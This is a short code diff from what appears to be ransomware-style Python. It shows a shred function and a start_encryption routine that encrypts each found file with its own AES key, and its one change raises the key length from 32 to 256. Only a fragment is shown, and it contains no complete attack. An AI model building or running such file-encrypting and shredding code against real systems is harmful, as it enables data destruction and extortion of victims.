@@ -74,7 +74,7 @@ def shred(file_name,  passes=1):
 def start_encryption(files):
     AES_and_base64_path = []
     for found_file in files:
-        key = generate_keys.generate_key(32, True)
+        key = generate_keys.generate_key(256, True)
         AES_obj = symmetric.AESCipher(key)
         
         found_file = base64.b64decode(found_file)
